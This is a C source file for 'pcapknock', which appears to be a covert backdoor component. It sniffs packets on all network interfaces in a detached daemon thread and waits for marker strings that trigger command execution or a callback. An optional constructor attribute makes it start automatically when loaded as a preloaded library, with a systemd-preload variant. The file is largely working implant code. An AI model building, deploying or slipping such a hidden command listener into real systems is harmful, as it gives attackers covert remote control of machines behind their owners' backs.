/*
 * pcapknock.c
 * Library/binary which uses pcap to wait for commands
 * By J. Stuart McMurray
 * Created 20190321
 * Last Modified 20190325
 */


#include <pcap.h>
#include <pthread.h>
#include <string.h>

#include "config.h"
#include "debug.h"
#include "packet.h"

#ifdef PRELOAD_SYSTEMD
#include "strlen.h"
#endif /* #ifdef PRELOAD_SYSTEMD */

#define BUFLEN 1024 /* Buffer length */
#define SNAPLEN 0xFFFF /* Snapshot length */
#define TO_MS 10 /* Capture timeout, in milliseconds */

int sniff_on(char *dev);
void do_pcap(void *p);
int start_capture(void);

/* sniff sniffs packets off the wire and responds to commands.  It starts the
 * sniffing in a detached daemon thread. */
#ifdef CONSTRUCTOR
__attribute__((constructor))
__attribute__((visibility ("default")))
#endif /* #ifdef CONSTURUCTOR */
int
pcapknock(void)
{
        /* We might be going for an init-only thing */
#ifdef PRELOAD_SYSTEMD
        if (0 != pthread_mutex_init(&mtx, NULL)) {
                return 11;
        }
        return 0;
#else /* !#ifdef PRELOAD_SYSTEMD */
        return start_capture();
#endif /* #ifdef PRELOAD_SYSTEMD */
}

/* start_capture actually starts the capture going */
int
start_capture(void)
{ 
        char errbuf[PCAP_ERRBUF_SIZE+1];
        pcap_if_t *alldevsp, *cur;
        int worky;

        /* Make sure the capture device is defined */
#ifndef CAPTUREDEV
#define CAPTUREDEV NULL
#endif /* #ifndef CAPTUREDEV */

        /* Get the lengths of the markers. */
        cblen = strlen(CBFLAG);
        cmdlen = strlen(CMDFLAG);

        /* If we have a device, use it */
        if (NULL != CAPTUREDEV && 0 != strlen(CAPTUREDEV)) {
                return sniff_on(CAPTUREDEV);
        }

        /* If we haven't a device, get a list of capturable devices */
        bzero(errbuf, sizeof(errbuf));
        if (0 != pcap_findalldevs(&alldevsp, errbuf)) {
                dbgx("findalldevs: %s", errbuf);
                return 1;
        }

        /* Capture on the devices */
        worky = 0;
        for (cur = alldevsp; NULL != cur; cur = cur->next) {
                /* Ignore loopback */
                if (0 == strncmp(cur->name, "lo", 2))
                        continue;
                /* Ignore the any interface, as we do this ourselves */
                if (3 == strlen(cur->name) &&
                                0 == strncmp(cur->name, "any",3 ))
                        continue;
                /* Start capturing on the device */
                if (0 == sniff_on(cur->name))
                        worky = 1;
        }
        pcap_freealldevs(alldevsp);

        if (worky) {
                return 0;
        } else {
                dbgx("no suitable device found for capture");
                return 2;
        }
}

/* sniff_on starts a pthread which captures on the given device and responds
 * to commands.  If an error occurs during initialization (i.e. before the
 * thread starts, a non-zero value is returned. */
int
sniff_on(char *dev)
{
        pcap_t *p;
        pthread_attr_t attr;
        pthread_t tid;
        char errbuf[PCAP_ERRBUF_SIZE+1];

        bzero(errbuf, sizeof(errbuf));

        /* Set up the pthread_attr to run the thread as a daemon */
        if (0 != pthread_attr_init(&attr)) {
                dbg("pthread_attr_init");
                return 4;
        }
        if (0 != pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED)) {
                dbg("pthread_attr_setdetachstate");
                return 5;
        }
        

        /* Open the capture device */
        if (NULL == (p = pcap_open_live(dev, SNAPLEN, 0, TO_MS, errbuf))) {
                dbgx("pcap_open_live (%s): %s", dev, errbuf);
                return 3;
        }


        /* Start the actual capture */
        dbgx("opened %s for sniffing", dev);
        if (0 != pthread_create(&tid, &attr, (void *(*)(void *))do_pcap,
                                (void *)p)) {
                /* dbg/dbgx will be called by do_pcap */
                return 6;
        }

        /* Release resources.  We don't return nonzero because the capture
         * (probably) succeeded, and if not we'll see it somewhere else. */
        if (0 != pthread_attr_destroy(&attr)) {
                dbg("pthread_attr_destroy");
        }

        return 0;
}

/* do_pcap does the actual sniffing.  It fork/execs to run a command or to
 * call back with a callback. */
void
do_pcap(void *p)
{
        /* Process packets */
        if (0 != pcap_loop((pcap_t *)p, -1, handle_packet, NULL))
                dbgx("pcap_loop: %s", pcap_geterr((pcap_t *)p));
        return;
}

